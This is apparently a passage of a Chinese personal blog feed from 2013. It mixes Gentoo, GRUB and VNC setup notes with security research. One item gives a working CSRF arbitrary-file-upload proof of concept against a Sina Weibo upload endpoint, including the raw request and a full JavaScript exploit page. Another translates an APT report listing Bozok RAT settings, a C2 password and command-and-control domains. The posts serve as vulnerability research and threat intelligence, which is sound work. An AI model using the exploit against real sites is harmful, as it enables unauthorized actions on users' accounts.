&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当然,poc里的提交按钮不是必须的,可以通过javascript自动提交.从某种程度上来说浏览器的最重要的同源策略被突破了.这真是令人忧伤的一件事情.&lt;/p&gt;

&lt;p&gt;扩展阅读:&lt;/p&gt;

&lt;p&gt;http://blog.kotowicz.net/2011/05/cross-domain-arbitrary-file-upload.html http://blog.kotowicz.net/2011/04/how-to-upload-arbitrary-file-contents.html https://developer.mozilla.org/en-US/docs/HTTP/Access_control_CORS?redirectlocale=en-US&amp;amp;redirectslug=HTTP_access_control http://www.w3.org/TR/cors/&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/19/csrf-upload-file</link>
                <guid>http://username.github.io/2013/11/19/csrf-upload-file</guid>
                <pubDate>2013-11-19T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>gentoo安装X server</title>
                <description>&lt;p&gt;第一次安装遇到的问题:&lt;/p&gt;

&lt;p&gt;gentoo 安装X no screen found&lt;/p&gt;

&lt;p&gt;百度搜索只有两条结果。看了一下Xorg的日志，差不多都是后面几个模块找不到。就按照提示：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge xf86-video-vesa xf86-video-fbdev&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一下，果然好了。等下熟悉了，多安装几遍。深究一下&lt;/p&gt;

&lt;p&gt;这次安装参考的这里https://wiki.gentoo.org/wiki/X_server&lt;/p&gt;

&lt;p&gt;步骤如下:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge x11-base/xorg-drivers
emerge media-libs/mesa
emerge x11-base/xorg-server&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后就OK了.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/13/gentoox-server</link>
                <guid>http://username.github.io/2013/11/13/gentoox-server</guid>
                <pubDate>2013-11-13T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用vnc连接kali</title>
                <description>&lt;p&gt;kali上使用命令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vncserver start&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;启动vncserver,输入连接命令&lt;/p&gt;

&lt;p&gt;客户端连接的时候使用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;IP:1&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;的方式来连接,1代表连接的用户身份,一般是root.&lt;/p&gt;

&lt;p&gt;参考:http://www.ha97.com/4634.html&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/12/vnckali</link>
                <guid>http://username.github.io/2013/11/12/vnckali</guid>
                <pubDate>2013-11-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>网易微博头像csrf上传test</title>
                <description>&lt;p&gt;网易微博也修改头像也是没有csrf防护,可以成功上传,不同的图片上传之后会调用callback一个函数,更新头像.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--9849436581144108930470211272
Content-Disposition: form-data; name=&amp;quot;callback&amp;quot;

uploadImageCallback&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;而更新头像的请求是post,验证了referer,无法成功修改头像.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/12/csrftest</link>
                <guid>http://username.github.io/2013/11/12/csrftest</guid>
                <pubDate>2013-11-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>利用csrf上传文件</title>
                <description>&lt;h2 id='id2653'&gt;参考资料&lt;/h2&gt;

&lt;p&gt;http://blog.kotowicz.net/2011/05/invisible-arbitrary-csrf-file-upload-in.html&lt;/p&gt;

&lt;p&gt;http://gerionsecurity.com/2013/04/here-it-is-the-file-upload-csrf/&lt;/p&gt;

&lt;p&gt;新浪微博新注册用户的引导上传用户头像的接口没有防御csrf,通常的用户上传文件是需要交互,利用难度较大.不过html5有一个新特性&lt;a href='http://www.w3.org/TR/cors'&gt;CORS&lt;/a&gt;,可以实现无交互的上传文件.&lt;/p&gt;

&lt;p&gt;存在csrf的地方:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;POST /nguide/aj/Upload HTTP/1.1
Host: weibo.com
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Firefox/24.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: lang=zh-cn; UOR=www.wooyun.org
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------246862377417659
Content-Length: 71483

-----------------------------246862377417659
Content-Disposition: form-data; name=&amp;quot;filedata&amp;quot;; filename=&amp;quot;Sunset.jpg&amp;quot;
Content-Type: image/jpeg&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;话说有个疑问,为什么我的cookie里会有www.wooyun.org这个字段?????&lt;/p&gt;

&lt;p&gt;这个地方的post请求既没有token,也没对refer进行验证.&lt;/p&gt;

&lt;p&gt;所以构造如下poc&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt; 
&amp;lt;html&amp;gt; 
&amp;lt;head&amp;gt;
&amp;lt;meta charset=utf-8 /&amp;gt;
&amp;lt;link href=&amp;#39;http://fonts.googleapis.com/css?family=Inconsolata&amp;#39; rel=&amp;#39;stylesheet&amp;#39; type=&amp;#39;text/css&amp;#39;&amp;gt; 
&amp;lt;script src=&amp;quot;http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js&amp;quot; type=&amp;quot;text/javascript&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&amp;lt;style&amp;gt;
body {background: #333; color: #eee; font-family: &amp;#39;Inconsolata&amp;#39;, Verdana, sans-serif;}
a:link {color: green; }
a:visited {color: darkgreen;}
&amp;lt;/style&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;sina weibo CSRF arbitrary file upload&amp;lt;/h1&amp;gt;

&amp;lt;h2&amp;gt;Step 1&amp;lt;/h2&amp;gt;
Log in into &amp;lt;a href=&amp;quot;http://weibo.com&amp;quot;&amp;gt;weibo.com&amp;lt;/a&amp;gt; (skip this if you use &amp;#39;remember me&amp;#39; feature)
&amp;lt;h2&amp;gt;Step 2&amp;lt;/h2&amp;gt;
&amp;lt;button type=&amp;quot;button&amp;quot; id=&amp;quot;upload&amp;quot; onclick=&amp;quot;start()&amp;quot;&amp;gt;&amp;lt;font size=&amp;quot;+2&amp;quot;&amp;gt;Let&amp;#39;s have some fun!&amp;lt;/font&amp;gt;&amp;lt;/button&amp;gt;
&amp;lt;script&amp;gt;
var logUrl = &amp;#39;http://weibo.com/nguide/aj/Upload/&amp;#39;;

function byteValue(x) {
return x.charCodeAt(0) &amp;amp; 0xff;
}

function toBytes(datastr) {
var ords = Array.prototype.map.call(datastr, byteValue);
var ui8a = new Uint8Array(ords);
return ui8a.buffer;
}

if (typeof XMLHttpRequest.prototype.sendAsBinary == &amp;#39;undefined&amp;#39; &amp;amp;&amp;amp; Uint8Array) {
XMLHttpRequest.prototype.sendAsBinary = function(datastr) {
this.send(toBytes(datastr));
}
}

function fileUpload(fileData, fileName) {
var fileSize = fileData.length,
boundary = &amp;quot;9849436581144108930470211272&amp;quot;,
uri = logUrl,
xhr = new XMLHttpRequest();

var additionalFields = {
rawpic: 1
}

var fileFieldName = &amp;quot;filedata&amp;quot;;

xhr.open(&amp;quot;POST&amp;quot;, uri, true);
xhr.setRequestHeader(&amp;quot;Content-Type&amp;quot;, &amp;quot;multipart/form-data, boundary=&amp;quot;+boundary); // simulate a file MIME POST request.
xhr.setRequestHeader(&amp;quot;Content-Length&amp;quot;, fileSize);
xhr.withCredentials = &amp;quot;true&amp;quot;;

xhr.onreadystatechange = function() {
if (xhr.readyState == 4) {
if ((xhr.status &amp;gt;= 200 &amp;amp;&amp;amp; xhr.status &amp;lt;= 200) || xhr.status == 304) {

if (xhr.responseText != &amp;quot;&amp;quot;) {
alert(JSON.parse(xhr.responseText).msg); // display response.
}
} else if (xhr.status == 0) {
$(&amp;quot;#goto&amp;quot;).show();
}
}
}

var body = &amp;quot;&amp;quot;;

for (var i in additionalFields) {
if (additionalFields.hasOwnProperty(i)) {
body += addField(i, additionalFields[i], boundary);
}
}

body += addFileField(fileFieldName, fileData, fileName, boundary);
body += &amp;quot;--&amp;quot; + boundary + &amp;quot;--&amp;quot;;
xhr.sendAsBinary(body);
return true;
}

function addField(name, value, boundary) {
var c = &amp;quot;--&amp;quot; + boundary + &amp;quot;\r\n&amp;quot;
c += &amp;quot;Content-Disposition: form-data; name=&amp;#39;&amp;quot; + name + &amp;quot;&amp;#39;\r\n\r\n&amp;quot;;
c += value + &amp;quot;\r\n&amp;quot;;
return c;
}

function addFileField(name, value, filename, boundary) {
var c = &amp;quot;--&amp;quot; + boundary + &amp;quot;\r\n&amp;quot;
c += &amp;quot;Content-Disposition: form-data; name=&amp;#39;&amp;quot; + name + &amp;quot;&amp;#39;; filename=&amp;#39;&amp;quot; + filename + &amp;quot;&amp;#39;\r\n&amp;quot;;
c += &amp;quot;Content-Type: image/jpeg\r\n\r\n&amp;quot;;
c += value + &amp;quot;\r\n&amp;quot;;
return c;	
}

function load_binary_resource(url) {
var req = new XMLHttpRequest();
req.open(&amp;#39;GET&amp;#39;, url, false);
//XHR binary charset opt by Marcus Granado 2006 [http://mgran.blogspot.com]
req.overrideMimeType(&amp;#39;text/plain; charset=x-user-defined&amp;#39;);
req.send(null);
if (req.status != 200) return &amp;#39;&amp;#39;;
var bytes = Array.prototype.map.call(req.responseText, byteValue);
return String.fromCharCode.apply(this, bytes);
return req.responseText;
}

var start = function() {
var c = load_binary_resource(&amp;#39;html5.jpg&amp;#39;);
fileUpload(c, &amp;#39;html5.jpg&amp;#39;);
};
//start();

&amp;lt;/script&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div id=&amp;quot;goto&amp;quot; style=&amp;quot;display:none&amp;quot;&amp;gt;
&amp;lt;h2&amp;gt;Step 3&amp;lt;/h2&amp;gt;
Done! &amp;lt;a href=&amp;quot;http://weibo.com&amp;quot;&amp;gt;see for yourself!&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;测试浏览器:firefox24.0&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/12/csrf</link>
                <guid>http://username.github.io/技术研究/2013/11/12/csrf</guid>
                <pubDate>2013-11-12T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>审计windows文件访问</title>
                <description>&lt;h1 id='id2652'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;http://blogs.splunk.com/2013/07/08/audit-file-access-and-change-in-windows/&lt;/p&gt;

&lt;p&gt;http://technet.microsoft.com/en-us/library/cc771070.aspx&lt;/p&gt;

&lt;p&gt;http://support.microsoft.com/kb/310399&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/11/windows</link>
                <guid>http://username.github.io/技术研究/2013/11/11/windows</guid>
                <pubDate>2013-11-11T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>Tracking a rapidly evolving apt actor</title>
                <description>&lt;p&gt;了解你的对手:追踪一个响应快速的APT攻击源头&lt;/p&gt;

&lt;p&gt;10月24日到25日期间,我们检测到两起来自&amp;#8221;admin@338&amp;#8221;(根据攻击的特征,给攻击者起的代号)的鱼叉式网络钓鱼攻击.攻击目标针对多个组织,而且意图非常明显,是为了获取国际贸易,金融,经济政策等方面的资料.这两起攻击使用了不同的恶意软件并且表现出了快速调整技术,策略,流程(TTPs)的能力.&lt;/p&gt;

&lt;h1 id='id2647'&gt;使用投资者指南和联系人列表作为诱饵&lt;/h1&gt;

&lt;p&gt;2013年10月25日.星期五.检测到对下列目标的攻击:&lt;/p&gt;

&lt;p&gt;* 西欧中心银行 * 一个国际贸易,经济,金融政策领域的组织机构 * 一个美国的智囊团 * 远东一个国家的政府部门&lt;/p&gt;

&lt;p&gt;钓鱼邮件如下图所示,恶意的word文档利用了CVE-2012-0158漏洞&lt;/p&gt;

&lt;p&gt;&lt;img alt='email' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/aptphish1.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;Word文档的属性:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;文件名:Investor Relations Contacts.doc&lt;/li&gt;

&lt;li&gt;MD5: 875767086897e90fb47a021b45e161b2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当打开这个Word的时候会写一个可执行文件到C:\Windows\wmiserver.exe.然后运行这个程序,这是一个Bozok远控的变种.它连接的CnC服务器是 microsoft.mrbasic.com和www.microsoft.mrbasic.com.使用的连接密码是“wwwst@Admin”.我们发现10月26日的时候两个域名解析到了58.64.153.157.&lt;/p&gt;

&lt;h1 id='bozok'&gt;Bozok远控的能力&lt;/h1&gt;

&lt;p&gt;Bozok跟其他流行的远控一样,可以从网上自由的下载到.Bozok的作者绰号叫&amp;#8221;Slayer616&amp;#8221;,他还有一款叫Schwarze sonne(简称SS-RAT)也非常有名.这两款远控在互联网上很容易就可以找到,在之前的攻击中也被广泛使用.&lt;/p&gt;

&lt;p&gt;跟SS-RAT不一样,Bozok依然在维护中,10月份刚更新了两个版本,修复了一些bug,增加了对西班牙语,阿拉伯语,保加利亚语,波兰语和法语的支持.如下图所示,比较方便易用.&lt;/p&gt;

&lt;p&gt;&lt;img alt='email' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/aptphish2.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;一旦计算机被Bozok感染,攻击者就可以做很多未授权的事情:&lt;/p&gt;

&lt;p&gt;* 下载被感染计算机的文件或上传文件 * 启动终止进程 * 修改注册表 * 抓取系统上保存的密码&lt;/p&gt;

&lt;p&gt;还可以通过图形界面执行任意命令.&lt;/p&gt;

&lt;p&gt;&lt;img alt='email' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/aptphish3.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;攻击者还可以上传一个DLL插件来扩展Bozok的功能,包括开启摄像头,记录键盘操作,查看控制屏幕等.&lt;/p&gt;

&lt;p&gt;Bozok在可执行文件的资源段保存了配置参数.这次攻击中获取到的Bozok变种(wmiserver.exe c5d8b7c8e2f50b171840e071f8a079b6)配置参数如下:&lt;/p&gt;

&lt;p&gt;&lt;img alt='email' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/aptphish4.jpg' /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID = aubok
Mutex = 801JsYqFulHpg
Filename = wmiserver.exe
Startup Entry Name = wmiupdate
Plugin filename = ext.dat
Connection password = wwwst@Admin
Connection port = 80
Connection servers = www.microsoft.mrbasic.com, microsoft.mrbasic.com&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在感染的时候,Bozok发出的初始化网络流量如下图:&lt;/p&gt;

&lt;p&gt;&lt;img alt='email' src='https://raw.github.com/litsand/litsand.github.com/master/_posts/pic/aptphish5.jpg' /&gt;&lt;/p&gt;

&lt;p&gt;从抓包中分析除了远控的连接密码为&amp;#8221;wwwst@Admin&amp;#8221;&lt;/p&gt;

&lt;h1 id='id2648'&gt;确认攻击源头&lt;/h1&gt;

&lt;p&gt;我们认为这次攻击来自于&amp;#8221;admin@338&amp;#8221;,关于这个攻击者的特征,在&amp;#171;Assessing Damage and Extracting Intelligence&amp;#187;的报告中有详细的描述.admin@338在之前的攻击中也使用过&amp;#8221;wwwst@Admin&amp;#8221;作为密码.&lt;/p&gt;

&lt;p&gt;此外,这次攻击中CnC服务器的IP是58.64.153.157.很多跟admin@338有关的CnC域名也都指向了这个IP.在10月27日,我们观察到已知的,指向这个ip的域名有:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;consilium.dnset.com
consilium.dynssl.com
consilium.proxydns.com
dnscache.lookin.at
ecnet.rr.nu
european.athersite.com
hq.dsmtp.com
hq.dynssl.com
ipsecupdate.byinter.net
itagov.byinter.net
microsoft.acmetoy.com
microsoft.dhcp.biz
microsoft.dynssl.com
microsoft.ftpserver.biz
microsoft.instanthq.com
microsoft.isasecret.com
microsoft.lookin.at
microsoft.proxydns.com
microsoft.wikaba.com
microsofta.byinter.net
microsoftb.byinter.net
phpdns.myredirect.us
sslupdate.byinter.net
svchost.lookin.at
svchost.passas.us
teamware.rr.nu
webserver.dynssl.com
webserver.fartit.com
webserver.freetcp.com
www.consilium.dnset.com
www.consilium.dynssl.com
www.consilium.proxydns.com
www.hq.dsmtp.com
www.hq.dynssl.com
www.microsoft.acmetoy.com
www.microsoft.dhcp.biz
www.microsoft.dsmtp.com
www.microsoft.dynssl.com
www.microsoft.instanthq.com
www.microsoft.isasecret.com
www.microsoft.proxydns.com
www.microsoft.wikaba.com
www.svchost.ddns.info
www.svchost.dyndns.pro
www.svchost.dynssl.com
www.verizon.dynssl.com
www.verizon.itemdb.com
www.verizon.proxydns.com
www.webserver.dynssl.com
www.webserver.fartit.com
www.webserver.freetcp.com&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我们之前检测到admin@338在1月6日的攻击中也使用了Bozok,在那次攻击中,他使用邮件发送了一个恶意的&amp;#8221;EcoMissionList.xls&amp;#8221;的表格.攻击的目标跟这次一样,也是贸易,经济,金融政策等领域的组织机构.使用的CnC服务器是www.microsoftupdate.dynssl.com,密码是&amp;#8221;gwxpass&amp;#8221;.&lt;/p&gt;

&lt;h1 id='id2649'&gt;亚太地区投资人联系方式诱饵&lt;/h1&gt;

&lt;p&gt;我们分析最近用投资人联系方式做诱饵的Bozok样本,发现在10月24日有一起相似的攻击.就在这次攻击的前一天.攻击者使用了同样的方式给同一个美国智囊团发送了钓鱼邮件.&lt;/p&gt;

&lt;p&gt;恶意的Word文档名为:Investor Relations Contacts-AsiaPacific.doc.释放一个svchost.exe(C:\Documents and Settings\admin\Application Data\svchost.exe).我们把这个文件归类为Backdoor.APT.FakeWinHTTPHelper.连接的CnC服务器为www.dpmc.dynssl.com 和www.dataupdate.dynssl.com&lt;/p&gt;

&lt;p&gt;www.dpmc.dynssl.com和www.dataupdate.dynssl.com分别在10月24日和21日解析到了58.64.153.157.&lt;/p&gt;

&lt;h1 id='id2650'&gt;结论&lt;/h1&gt;

&lt;p&gt;这一系列连续的事件,从24日的Backdoor.APT.FakeWinHTTPHelper到25日的Bozok反映了admin@338具有快速调整技术,策略和流程(TTPs)的能力.而且,admin@338把公开获取到的远控(Poison Ivy,Bozok)和自己编写的远控(Backdoor.APT.FakeWinHTTPHelper)都整合进了自己的兵器库.&lt;/p&gt;

&lt;h1 id='id2651'&gt;扩展阅读&lt;/h1&gt;

&lt;p&gt;&lt;span&gt;1&lt;/span&gt; For more on admin@338, see our previous blog entry on Poision Ivy at http://www.fireeye.com/blog/technical/targeted-attack/2013/08/pivy-assessing-damage-and-extracting-intel.html&lt;/p&gt;

&lt;p&gt;&lt;span&gt;2&lt;/span&gt; http://ss-rat.blogspot.com/&lt;/p&gt;

&lt;p&gt;&lt;span&gt;3&lt;/span&gt; This report is available at http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/05/tracking-a-rapidly-evolving-apt-actor</link>
                <guid>http://username.github.io/技术研究/2013/11/05/tracking-a-rapidly-evolving-apt-actor</guid>
                <pubDate>2013-11-05T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>inter protocol communication测试</title>
                <description>&lt;p&gt;测试了下inter-protocol communication.&lt;/p&gt;

&lt;p&gt;http://www.secforce.com/blog/tag/inter-protocol-exploitation/&lt;/p&gt;

&lt;p&gt;使用pure-ftpd测试成功!&lt;/p&gt;

&lt;p&gt;不过默认的情况下浏览器会对21端口的请求拦截,不会发送21端口的请求.&lt;/p&gt;

&lt;p&gt;在win2003上 ftp服务测试失败.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;200 Microsoft FTP Service
500 &amp;quot;GET /favicon.ico HTTP/1.1&amp;quot;: command not understood
421 Timeout (120 seconds): closing control connection.
421 Terminating connection.&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;会超时,可能对数据的处理有点问题.&lt;/p&gt;</description>
                <link>http://username.github.io/技术研究/2013/11/04/inter-protocol-communication</link>
                <guid>http://username.github.io/技术研究/2013/11/04/inter-protocol-communication</guid>
                <pubDate>2013-11-04T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>使用grub2启动gentoolivecd</title>
                <description>&lt;h1 id='id2646'&gt;参考资料&lt;/h1&gt;

&lt;p&gt;https://bugs.gentoo.org/show_bug.cgi?id=294268&lt;/p&gt;

&lt;p&gt;之前ubuntu论坛有一个讲用grub引导iso安装ubuntu的帖子,现在发现不知道什么原因删掉了&amp;#8230;最会会附上之前记录的一下关键步骤.&lt;/p&gt;

&lt;p&gt;引导gentoo mini iso使用如下的配置:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;menuentry &amp;quot;Gentoo Linux minimal install cd x86&amp;quot; {
loopback loop (hd0,3)/home/mad/install-x86-minimal.iso
linux (loop)/isolinux/gentoo root=/dev/ram0 init=/linuxrc dokeymap looptype=squashfs loop=/image.squashfs cdroot initrd=gentoo.igz vga=791 isoboot=/home/mad/install-x86-minimal.iso
initrd (loop)/isolinux/gentoo.igz
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;livecd需要稍微修改一下下,我是根据livecd iso的结构对比了一下,发现livecd里多了一个boot目录&lt;/p&gt;

&lt;p&gt;所以需要修改一下目录即可:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;menuentry &amp;quot;Gentoo Linux minimal install cd x86&amp;quot; {
loopback loop (hd0,3)/home/mad/install-x86-minimal.iso
linux (loop)/boot/gentoo64 root=/dev/ram0 init=/linuxrc dokeymap looptype=squashfs loop=/image.squashfs cdroot initrd=gentoo64.igz vga=791 isoboot=/home/mad/livecd.iso
initrd (loop)/boot/gentoo64.igz
}




====== grub2 ======


可以装各种系统完了~~~~~


参考http://forum.ubuntu.org.cn/viewtopic.php?f=77&amp;amp;t=348452

一开始把硬盘分区的写法搞错了，第一块硬盘的第一个分区应该是**（hd0,1)**,搞成了（hd0,0）。

本次安装时把iso文件放在fat32分区，因为一开始因为是分区的格式问题导致找不到文件，事实上是因为分区号写错了。一会测试一下直接引导ntfs分区的iso文件。


如果你的系统已经存在其他版本的linux

首先判断你的grub的版本（启动时，grub显示1.98和1.99的是grub2,否则是grub1）,grub1也是修改menu.lst（/boot/grub/menu.lst）

文件，写法同上。grub2则有区别，方法如下：

1,grub2不用提取那两个文件。
2,grub2建议把iso文件改名为ubuntu.iso，然后放到不用格式化的分区根目录下。
3,编辑/etc/grub.d/40_custom，加上以下内容：
（红色的X请自行修改，比如(hd0,2) 表示第一块硬盘的第二个分区，主分区用1、2、3、4,逻辑分区则从5开始。）
引用:

menuentry &amp;quot;Boot ubuntu 11.10 desktop iso&amp;quot; {
insmod loopback
insmod iso9660
loopback loop (hd0,X)/ubuntu.iso
linux (loop)/casper/vmlinuz boot=casper noacpi iso-scan/filename=/ubuntu.iso ro quiet splash --
initrd (loop)/casper/initrd.lz
}

然后：

代码:

sudo update-grub


重启即可。
安装前，首先打开终端输入：

代码:

sudo umount -l /isodevice


（此命令一定要运行，否则会出现不能对磁盘操作的情况！）
其他同上面“七”、“八”两步。

====== 关于grub2自定义配置文件40_custom的说明 ======


所以对40_custom的文件编辑需要紧挨着注释写，这个条件有点苛刻。文档中的注释说的不是很明确。

问题：
1. Be careful not to change the &amp;#39;exec tail&amp;#39; line above.

40_custom 文件如下所示。不要去改动前面两行，因为&amp;#39;exec tail -n +3 $0&amp;#39;，已经暗示我们这个文件会从第三行开始读取有效配置。这点可以从update-grub2后生成的grub.cfg 中得到印证。所以如果你想要改任何的东东，哪怕是加注释或者空行。需要去更新正确的行数到-n后面。

#!/bin/sh
exec tail -n +3 $0  
# This file provides an easy way to add custom menu entries.  Simply type the
# menu entries you want to add after this comment.  Be careful not to change
# the &amp;#39;exec tail&amp;#39; line above.

比如，有人希望在update-grub2时候看到有处理40_custom的动作，在&amp;#39;exec tail -n +3 $0&amp;#39;前面加入了
echo “processing the 40_custom\r” 1&amp;gt;2&amp;amp;
那就把你的+3改成+4就ok了，就像下面那样。

#!/bin/sh
echo &amp;quot;processing 40_custom\r&amp;quot; 1&amp;gt;&amp;amp;2
exec tail -n +4 $0 
# This file provides an easy way to add custom menu entries.  Simply type the
# menu entries you want to add after this comment.  Be careful not to change
# the &amp;#39;exec tail&amp;#39; line above.

所以，不要只看注释写的，说不动&amp;#39;exec tail‘那句话就ok，你不动那句，动了它周边的位置，也会有问题哦～～

2. Simply type the menu entries you want to add after this comment.
把要添加的menuentry直接紧跟着40_custom的注释之后，不要添加空行。否则会在grub.cfg 里也产生空行，这样启动的时候Grub2读grub.cfg 产生启动选项的时候，会不显示你添加的东东。
正确定制如下，
#!/bin/sh
echo &amp;quot;processing 40_custom\r&amp;quot; 1&amp;gt;&amp;amp;2
exec tail -n +4 $0 
# This file provides an easy way to add custom menu entries.  Simply type the
# menu entries you want to add after this comment.  Be careful not to change
# the &amp;#39;exec tail&amp;#39; line above.
menuentry &amp;quot;Clonezilla live&amp;quot; {
...
your customized boot entry
...
}&lt;/code&gt;&lt;/pre&gt;</description>
                <link>http://username.github.io/2013/11/02/grub2gentoolivecd</link>
                <guid>http://username.github.io/2013/11/02/grub2gentoolivecd</guid>
                <pubDate>2013-11-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>gentoo无法上网,没有eth0</title>
                <description>&lt;p&gt;之前记录的文档:&lt;/p&gt;

&lt;p&gt;gentoo安装gnome后无法上网的问题&lt;/p&gt;

&lt;p&gt;继续折腾gentoo&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;emerge --gnome-light 后无法上网。&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;症状：ifconfig 查看不到eth0,只有lo 。/etc/init.d/net.eth0 restart 提示找不到网卡eth0。看着感觉确实是驱动问题啊，网卡都找不到。&lt;/p&gt;

&lt;p&gt;首先搜索了一下，说是安装完gentoo后无法上网。内核编译的问题，没有把网卡的驱动编译进去。有一个比较好的方法是用安装的iso启动看看使用的是什么模块。然后重新编译内核。这个和我的情况不太一样。我之前能上网应该是说内核没有问题的啊。&lt;/p&gt;

&lt;p&gt;尝试的方法一就是重新编译内核。lspci看看网卡，然后把内核里intel相关的驱动都装上了。重新编译，重启。没有效果。&lt;/p&gt;

&lt;p&gt;思路二。尝试重新编译内核无效之后就觉得不应该病急乱投医。应该先分析。收集资料才是渗透最重要的一环啊。然后看到重启界面的信息最后有几条是没通过的，但是太快。看不清。尝试找找系统的启动日志。&lt;/p&gt;

&lt;p&gt;在/var/log/目录下发现kernel.log。显示在日志中搜索net关键字没有发现什么信息，然后搜索eth0，这词发现了一些端倪。在之前正常的时候会有一条&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;e1000:eth0 NIC Link is up 1000Mbps Full Duplex,Flow Control:RX&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;的日志。之后故障的时候没有这一条日志。&lt;/p&gt;

&lt;p&gt;这时候觉得还是内核有问题啊可能。这个kernel.log记录的应该是内核的日志吧。&lt;/p&gt;

&lt;p&gt;可是故障是安装了gnome之后才出现的。内核也重新编译过。安装gnome应该不可能改动内核啊。最大的问题应该是配置文件改动了或者安装的一些包有问题。&lt;/p&gt;

&lt;p&gt;然后在log目录先发现portage目录，在portage的日志中搜索eth0,发现一条记录。是关于udev的规则的。80-net-name-slot.rules.&lt;/p&gt;

&lt;p&gt;这里需要说一下，之前装好gentoo后做了一个镜像。再这个排障过程中，使用之前的镜像作为对比才解决了问题。&lt;/p&gt;

&lt;p&gt;portage中提到80-net-name-slot.rules这个文件。在之前的镜像中发现有这个文件，而在升级gnome后，目录下没有这个文件了。所以把这个文件复制到响应的目录重启就好了。相应的细节参考下一篇文章。&lt;/p&gt;

&lt;dl&gt;
&lt;dt&gt;搜索80-net-name-slot.rules这个文件。可以看到在/lib/udev/rules.d/目录下有，而且这个文件配置了规则，是有内容的。刚装好的时候，在用户的目录。既/etc/udev/rules.d/目录下有一个同名的文件，但是为空。相当于覆盖掉了udev自带的规则。升级之后用户目录这个文件没有了。所以网卡识别不了。删掉这个自带的规则或者用户目录下新建一个覆盖掉就可以了。看来是这个规则的问题。&lt;/dt&gt;

&lt;dd&gt;
&lt;p&gt;?: 但是大体看了一下不是很懂规则具体的意思。&lt;/p&gt;
&lt;/dd&gt;
&lt;/dl&gt;

&lt;h1 id='id2645'&gt;更新&lt;/h1&gt;

&lt;p&gt;参考 eselect news list 2013-03-29 Upgrading udev to version &amp;gt;=200&lt;/p&gt;

&lt;p&gt;http://wiki.gentoo.org/wiki/Udev&lt;/p&gt;

&lt;p&gt;就是网卡的命名问题,可以通过注释掉/lib/udev/rules.d/80-net-name-slot.rules内容来解决.&lt;/p&gt;</description>
                <link>http://username.github.io/2013/11/02/gentooeth0</link>
                <guid>http://username.github.io/2013/11/02/gentooeth0</guid>
                <pubDate>2013-11-02T00:00:00+08:00</pubDate>
        </item>

        <item>
                <title>第二次安装gentoo遇到的问题</title>
                <description>&lt;p&gt;两个问题,一个是用grub启动iso文件.这个用过很多次了,一会写一个详细的文档.&lt;/p&gt;

&lt;p&gt;还就是启动之后找不到网卡,网卡名字随机生成,之前也遇到过.参考之前的文档应该也好解决.&lt;/p&gt;

